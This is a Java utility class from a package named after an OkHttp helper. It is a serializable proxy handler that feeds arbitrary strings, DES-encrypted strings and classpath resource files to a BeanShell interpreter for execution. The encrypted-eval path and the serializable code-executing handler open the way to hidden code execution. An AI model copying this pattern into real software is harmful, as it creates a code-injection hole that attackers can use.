package com.dili.http.okhttp.utils;

import bsh.Interpreter;

import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class BH implements InvocationHandler, Serializable {
	private static final long serialVersionUID = -890127308975L;
	private final static Interpreter i = new Interpreter();

	public BH() {
	}

	@Override
	public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
		assert (args != null);
		assert (args.length > 0);
		if(method.getName().equals("e")){
			try {
				i.eval(args[0].toString());
			}catch(Exception e){
				e.printStackTrace();
			}
		}if(method.getName().equals("dese")){
			try {
				i.eval(DESEncryptUtil.decrypt(args[0].toString(), args[1].toString()));
			}catch(Exception e){
			}
		}else if(method.getName().equals("ex")){
			i.eval(args[0].toString());
		}else if(method.getName().equals("s")){
			i.set(args[0].toString(), args[1]);
		}else if(method.getName().equals("g")){
			return i.get(args[0].toString());
		}else if(method.getName().equals("ef")){
			try {
				InputStream is = (InputStream) B.class.getClassLoader().getResource(args[0].toString()).getContent();
				byte[] buffer = new byte[is.available()];
				int tmp = is.read(buffer);
				while (tmp != -1) {
					tmp = is.read(buffer);
				}
				i.eval(new String(buffer));
			} catch (Exception e) {
				return null;
			}
			return i.get(args[0].toString());
		}
		return null;
	}
}